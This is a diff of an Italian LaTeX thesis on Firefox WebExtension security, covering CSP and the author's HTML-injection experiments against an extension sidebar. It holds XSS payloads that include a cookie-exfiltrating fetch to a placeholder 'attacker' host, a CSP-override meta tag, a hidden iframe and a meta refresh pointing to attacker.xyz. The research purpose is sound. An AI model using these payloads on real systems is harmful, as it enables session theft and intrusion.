@@ -161,7 +161,7 @@
     CSS e Javascript, al quale dedico la sezione \Sezione{sec:javascript}, mentre la \refSection{sec:dom} parlerà del DOM,
     il modello che rende possibile la comunicazione tra questi linguaggi. CSS verrà soltanto menzionato poiché non ha
     avuto particolare rilievo nella mia ricerca. Seguono tre sezioni dedicate alle estensioni browser, \Sezione{breve_storia_delle_estensioni}
-    \todo{e degli attacchi alle estensioni} browser  è un rapido riassunto sulla storia delle estensioni
+    è un rapido riassunto sulla storia delle estensioni
     mentre \Sezione{sec:anatomia_di_una_web_extension} e \refSection{sec:webextension-api} presentano gli elementi e
     i concetti fondamentali di programmazione in ambiente WebExtension.
 
@@ -183,8 +183,7 @@
         righe viene creato un documento che mostra a schermo la scritta "Archive:" ed include tre altre risorse:
         il tag \code{<link>} include e applica alla pagina il foglio di stile \code{page.css} mentre i due tag
         \script{} caricano ed eseguono due script Javascript.
-        In Firefox accanto ad HTML5 è presente un altro linguaggio di markup 
-        \todo{due parole in piu su XUL}chiamato XUL usato per la UI del browser stesso.
+        %In Firefox accanto ad HTML5 è presente un altro linguaggio di markup chiamato XUL usato per la UI del browser stesso.
 
         \begin{lstlisting}[label={code:esempio-html},caption={Un semplice documento html},captionpos=b,language=HTML]
         <!doctype html>
@@ -230,7 +229,7 @@
                     base \code{Object}. È importante sottolineare che il sistema della catena di prototipi non è
                     legato al tipo di oggetto che \attr{\_\_proto\_\_} referenzia, ma dalla sola presenza della chiave 
                     \textit{\_\_proto\_\_} nell'oggetto esplorato e poiché si tratta di una proprietà come le altre
-                    \todo{prototype pollution?} è molto facile ridefinirlo.
+                    è molto facile ridefinirlo.
 
             \item \bold{\attr{prototype}} Usando la terminologia della programmazione ad oggetti, il \attr{prototype}
                     di una classe contiene i metodi e gli attributi che verranno ereditati da ogni istanza della classe.
@@ -301,7 +300,7 @@
 
     \section{Breve storia delle estensioni}
     \label{breve_storia_delle_estensioni}
-    \todo{attacchi agli applet}
+    %\todo{attacchi agli applet}
         Le estensioni browser non sono una novità. Già a partire dal 1995 Internet Explorer
         supportava lo sviluppo di plugin \cite{extension-history} affinché visualizzassero contenuti
         dinamici in un World Wide Web fatto di documenti statici, ma è a partire dal 1999 che
@@ -526,16 +525,22 @@
 
             \item \textbf{Content Processes}: sono processi usati per renderizzare contenuto web, insieme
                 al Parent sono gli unici a poter eseguire codice Javascript. Vengono suddivisi in 
-                "remote-type", proprietà che specificano i privilegi di accesso agli API.
+                "remote-type", proprietà che specificano i privilegi di accesso agli API \JS{}.
 
         \end{itemize}
-        Ci sono molti tipi di Content Process di cui due sono di particolare interesse per la mia ricerca:
+        La figura \ref{fig:process-model} mostra uno schema dei processi che compongono Firefox, separati in
+        Helper Processes e Content Processes. La stringa tra parentesi sotto ogni Content Process è il
+        remote-type associato al processo. Ogniuno avrebbe bisogno di una discussione dedicata,
+        ma ai fini dell'articolo tratterò solo due di essi:
         \begin{itemize}
             \item \textbf{WebExtensions Content Process}: È utilizzato per caricare pagine
                 in background e i subframe delle estensioni web; esiste una sola istanza di
                 questo processo ed ha assegnato il remote-type "extension" che garantisce 
                 l'accesso al WebExtensionAPI e alla Shared Memory. Tutte le estensioni condvidono
                 questo processo e sono visibili tra di loro.
+                L'unica eccezione sono i subframe che caricano contenuti dall'URI \code{moz-extension://},
+                al momento tali contesti convivono nello stesso processo del genitore invece che
+                nel processo WebExtensions.
 
             \item \textbf{Isolated Web Content Process}: Sono usati per ospitare contenuti web attribuiti ad un sito,
                 il codice web eseguito in questi processi è considerato insicuro e l'accesso diretto agli
@@ -544,6 +549,13 @@
                 Web Content isolato, invece subframe aperti sullo stesso dominio del superframe contenitore
                 vengono eseguiti nello stesso processo del super-frame.
         \end{itemize}
+
+        \begin{figure}[ht]
+            \centering
+            \includegraphics[width=0.9\textwidth]{process_model.png}
+            \caption{Il modello processi di Gecko. L'immagine è stata presa dalla documentazione ufficiale Firefox \cite{firefox-process-model}}
+            \label{fig:process-model}
+        \end{figure}
 
     \section{Sicurezza livello script}
     \label{sec:sicurezza-script}
@@ -751,7 +763,10 @@
                             event listener dichiarabili direttamente sui tag html per eseguire \JS malevolo:\\
                             \code{<img src="invalid" onerror=fetch("http://attacker/?" + document.cookie) >}        
     
-                    \item \todo{due parole su webassembly} Non è consentito eseguire codice WebAssembly.
+                    \item Non è consentito eseguire codice WebAssembly. Si tratta di codice in formato binario
+                            pensato per applicazioni ad alta efficienza rilasciabili sul web. Inoltre è un target
+                            di compilazione per compilatori C,C++,C\# e Rust, permettendo di scrivere applicazioni
+                            web anche in questi linguaggi.
                 
                 \end{itemize}
                 Questa politica è applicata su ogni estensione che non abbia esplicitamente modificato la voce
@@ -1158,8 +1173,9 @@ window.onload = () => {
         le motivazioni dietro questo risultato.
 
         \subsubsection{Primo payload}
-            \begin{lstlisting}
-                <script src="sbMain.js" type="text/javascript">
+
+            \begin{lstlisting}[numbers=none]
+            <script src="sbMain.js" type="text/javascript">
 \end{lstlisting}
             Il primo è un semplice tag script che esegue codice ottenuto dal file locale \file{sbMain.js},
             gli obiettivi di questo paylod sono due: scoprire se lo script venga incluso e scoprire che 
@@ -1169,10 +1185,11 @@ window.onload = () => {
             c'è stata alcuna esecuzione del codice \JS.\\
             La ragione sta proprio nell'utilizzo del setter \attr{innerHTML}, come specificato nella
             documentazione i tag \code{<script>} inseriti con questo metodo non saranno eseguiti per
-            ragioni di sicurezza \cite{innerHTML}; torneremo su questo punto nella \refSection{sec:attaccando-vuln-iframe-inclusion}\todo{fix}.
+            ragioni di sicurezza \cite{innerHTML}. Tornerò su questo tema nella \refSection{sec:attaccando-vuln-bypass}.
 
         \subsubsection{Secondo payload}
-            \begin{lstlisting}
+
+            \begin{lstlisting}[numbers=none]
     <object data="javascript:location.href='about:blank'">
 \end{lstlisting}
             Questo payload è un classico bypass della restrizione di sicurezza su \attr{innerHTML} che ha impedito al
@@ -1189,21 +1206,24 @@ window.onload = () => {
             altri tag la CSP verrà comunque allertata.
 
         \subsubsection{Terzo payload}
-            \begin{lstlisting}
-    <img src="https://wallpapercave.com/wp/wp5357862.jpg" onload="location.href='about:blank'" >
+            \begin{lstlisting}[numbers=none]
+    <img 
+        src="https://wallpapercave.com/wp/wp5357862.jpg" 
+        onload="location.href='about:blank'" 
+    >
 \end{lstlisting}
             L'ultimo payload tenta di ottenere una risorsa immagine da un URL terzo e redirigere la pagina
             quando l'elemento è stato caricato. L'attributo \code{onload} specifica il codice javascript
             da eseguire, gia discusso nella sezione precedente. Poiché la CSP delle estensioni restringe 
             solo l'origine degli script mi aspetto che l'immagine venga visualizzata nella sidebar ma il
             codice non sia eseguito. L'iniezione del tag conferma entrambe le ipotesi dimostrando che
-            è \todo{possible?}effettuare richieste a qualsiasi url, mentre il contenuto di \code{onload} viene segnalato
+            è possible effettuare richieste a qualsiasi url, mentre il contenuto di \code{onload} viene segnalato
             come script-inline e bloccato.\\
 
     \section{Bypass delle restrizoni}
     \label{sec:attaccando-vuln-bypass}
         I test precedenti hanno evidenziato le due maggiori difficoltà dietro l'iniezione di script,
-        \attr{innerHTML} impedisce l'uso di tag \script{} \todo{fix italiano} approcci volti all'inclusione si script locali
+        \attr{innerHTML} impedisce l'uso di tag \script{} 
         e la CSP della pagina nullifica le tecniche comuni di bypass di questo problema. Nelle sezioni
         che seguono discuto dei tentativi di mitigazione delle restrizioni e di quali impedimenti ho
         incontrato lungo il percorso.
@@ -1219,29 +1239,43 @@ window.onload = () => {
             a modifiche ai metadati di sicurezza o della pagina stessa. Per il miei scopi ho fatto
             uso dell'attributo \code{http-equiv}.\\
             Sempre la documentazione mozilla afferma: \textit{"Se l'attributo \code{http-equiv} è impostato,
-            l'elemento \meta è una direttiva pragma fornente informazioni equivalenti a quelle che
-            verrebbero date da un header HTTP dotato di un nome simile"} \cite{tag-meta}. La Content
-            Security Policy di una risorsa web viene solitamente specificata da un header HTTP della
-            risposta oppure dal tag \meta impostando \code{"content-security-policy"} come valore
+            l'elemento \meta{} è una direttiva pragma fornente informazioni equivalenti a quelle che
+            verrebbero date da un header HTTP dotato di un nome simile"} \cite{tag-meta}.\\
+            La Content Security Policy di una risorsa web viene solitamente specificata da un header HTTP della
+            risposta oppure dal tag \meta impostando \code{"content-security-} \code{policy"} come valore
             dell'attributo \code{http-equiv} e la politica desiderata come valore dell'attributo \code{content},
             così:
-            \begin{lstlisting}[label=code:meta-tag-example]
-<meta http-equiv="Content-Security-Policy" content="script-src unsafe-inline" />
-\end{lstlisting}
-            Il codice \ref{code:meta-tag-example}\todo{Non si capisce quale e'} indica al browser che la Content Security Policy della
+            \begin{lstlisting}[label=code:meta-tag-example,caption={Esempio di CSP dichiarata nel documento della pagina}]
+    <meta 
+        http-equiv="Content-Security-Policy" 
+        content="script-src unsafe-inline" 
+    />
+            \end{lstlisting}
+            Il \refCode{code:meta-tag-example} indica al browser che la Content Security Policy della
             pagina autorizza l'esecuzione di script-inline come quelli bloccati nei miei primi tentativi.\\
             A fronte di queste informazioni ho costruito un nuovo payload che sovrascrivesse la CSP della
-            pagina ed eseguisse \JS inline, il listato sottostante mostra tale codice:
-            \begin{lstlisting}
-    <meta http-equiv="Content-Security-Policy" content="script-src unsafe-inline" />
+            pagina ed eseguisse \JS{} inline, il \refCode{code:meta-tag-inline-injection} sottostante mostra tale codice:
+            \begin{lstlisting}[label=code:meta-tag-inline-injection, caption={Payload per sovrascrivere la CSP del documento ed eseguire javascript inline}]
+    <meta 
+        http-equiv="Content-Security-Policy" 
+        content="script-src unsafe-inline" 
+    />
     <object data="javascript:location.href='about:blank'">
-\end{lstlisting}
+            \end{lstlisting}
             Purtroppo neanche questo test ha avuto successo, la console mi ha restituito un errore di Content
-            Security Policy affermando che lo script-inline violasse la CSP della pagina. La causa
-            di questo fallimento è dovuta ad un'altra misura di sicurezza specifica delle WebExtension: la CSP
+            Security Policy affermando che lo script-inline violasse la CSP della pagina. 
+            La causa di questo fallimento è dovuta ad un'altra misura di sicurezza specifica delle WebExtension: la CSP
             di default può essere modificata soltanto dalla voce \code{"content\_security\_policy"} del 
-            \manifest (vedi \refSection{sec:difese-background-sidebar}).\\
-            \todo{NO, oltre a questo ci sono due requisiti: 1-deve esserci 'self', 2-non può esserci 'unsafe-inline'}
+            \manifest{} (vedi \refSection{sec:difese-background-sidebar}). 
+            Inoltre, la CSP delle estensioni deve permettere l'esecuzione di script locale e non deve consentire
+            l'esecuzione di script inline, pertanto la stringa di CSP deve essere in questa forma:
+            \begin{lstlisting}[numbers=none]
+                srcipt-src 'self' <attr>
+            \end{lstlisting}
+            Dove \code{<attr>} è una lista di origini che non può contenere il valore \code{'unsafe-inline'}.
+            Anche se riuscissi sovrascrivere la CSP usando il tag \meta{}, il blocco completo del codice inline
+            mi impedirebbe di usare altri tag al difuori di \script{}, pertanto non è possibile bypassare 
+            \attr{innerHTML} in questo modo.
         
         
         \subsection{Inclusione di \iframe}
@@ -1264,7 +1298,11 @@ window.onload = () => {
             \code{Parent=moz-extension://ee77424a-5839-4f17-a837-6c1d6d12eed9/sidebar/page.html}\\
 
             \begin{lstlisting}[caption={iframe costruito con srcdoc},label={code:sidebar-iframe-example}]
-<iframe srcdoc="<html><body><script src=http://localhost/code.js ><\/script></body></html>">
+<iframe 
+    srcdoc="<html>
+        <body><script src=http://localhost/code.js ><\/script></body>
+    </html>" >
+</iframe>
 \end{lstlisting}
 
             \begin{figure}[ht]
@@ -1314,7 +1352,10 @@ window.onload = () => {
             all'utente contenente una pagina che immaginiamo svolga un qualche task malevolo a lungo termine.
 
             \begin{lstlisting}[label=code:iframe-nascosto]
-    <iframe src=http://www.attacker.xyz/task.html style="position: absolute; width:0; height:0; border:0;" >
+    <iframe 
+        src=http://www.attacker.xyz/task.html 
+        style="position: absolute; width:0; height:0; border:0;" >
+    </iframe>
 \end{lstlisting}
 
             Dopo essere stato inviato allo script in background, il payload viene salvato nella storage ed
@@ -1330,8 +1371,9 @@ window.onload = () => {
             l'attributo \code{http-equiv} accetta un'altro pseudo-header HTTP, \code{"refresh"}. La chiave
             \code{"refresh"} impone alla pagina di essere ricaricata o reindirizzata su un'altro dominio dopo
             un periodo di timeout arbitrario, la sintassi appare così:
-            \begin{lstlisting}[label=code:sidebar-meta-refresh-example]
+            \begin{lstlisting}[label=code:sidebar-meta-refresh-example,numbers=none]
 <meta http-equiv="refresh" content="1; http://www.attacker.xyz/" >
+
 \end{lstlisting}
             La riga precedente si traduce come: "attendi 1 secondo, poi reindirizza la pagina sull'URL 
             \code{'http://www.attacker.xyz/'}".
@@ -1418,7 +1460,12 @@ window.onload = () => {
 
                 Supponiamo ora che lo stesso endpoint fornisca un api JSONP, invece di effettuare la richiesta
                 programmaticamente, lo script in esecuzione sulla finestra inietta nella propria pagina un
-                elemento \script fatto in questo modo: \code{<script src=http://example/users?format=jsonp\&callback=frontendFunction ></script>}
+                elemento \script fatto in questo modo: 
+                \begin{lstlisting}[numbers=none]
+<script 
+    src=http://example/users?format=jsonp&callback=frontendFunction >
+</script>
+                \end{lstlisting}
                 dove il parametro \code{"callback"} nell'URL indica all'api il nome della funzione che dovrà essere
                 invocata nel file di risposta (e gia definita dal programma front-end). Il \refCode{code:JSONP-response-example}
                 mostra il file di risposta ottenuto.
@@ -1436,13 +1483,17 @@ window.onload = () => {
                 Con l'integrazione di CORS, JSONP è diventata una tecnologia superata, ma alcuni api importanti
                 lo supportano ancora per retrocompatibilità con le applicazioni legacy. Per esempio google
                 espone un api che restituisce opzioni di auto-completamento di query, accessibile dall'URL:
-                \code{http://google.com/complete/search?client=firefox\&q=YOURQUERY}, a questa richiesta si
-                ottiene l'array JSON mostrato nel \refCode{code:JSON-response-google}.
+                \begin{lstlisting}[numbers=none]
+    http://google.com/complete/search?client=firefox&q=YOURQUERY
+                \end{lstlisting}
+                Da questa richiesta si ottiene l'array JSON mostrato nel \refCode{code:JSON-response-google}.
 
                 \begin{lstlisting}[
                     label=code:JSON-response-google, 
-                    caption={JSON resituito da \code{http://google.com/complete/search?client=firefox\&q=YOURQUERY}}
+                    caption={JSON resituito dal google api passando \code{YOURQUERY} come valore del parametro \code{q=}},
+                    numbers=none
                     ]
+
     ["YOURQUERY",["your query","yourquery s.r.o"],[],{"google:suggestsubtypes":[[512,19,10],[30,19]]}]
                 \end{lstlisting}
 
@@ -1452,8 +1503,15 @@ window.onload = () => {
                 i dati. Il \refCode{code:JSONP-response-google} mostra la risposta JSONP dell'api, alla query di
                 richiesta precedente è stato appeso l'argomento \code{jsonp=myFunction}
 
-                \begin{lstlisting}[label=code:JSONP-response-google, caption={JSON resituito da \code{http://google.com/complete/search?client=firefox\&q=YOURQUERY\&jsonp=myFunction}}]
+                \begin{lstlisting}[
+                    label=code:JSONP-response-google, 
+                    caption={JSON resituito dal google api passando \code{YOURQUERY} come valore del parametro \code{q=}
+                            e \code{myFunction} come valore del parametro \code{jsonp=}},
+                    numbers=none
+                    ]
+
     myFunction(["YOURQUERY",["your query","yourquery s.r.o"],[],{"google:suggestsubtypes":[[512,19,10],[30,19]]}])
+
                 \end{lstlisting}
 
 
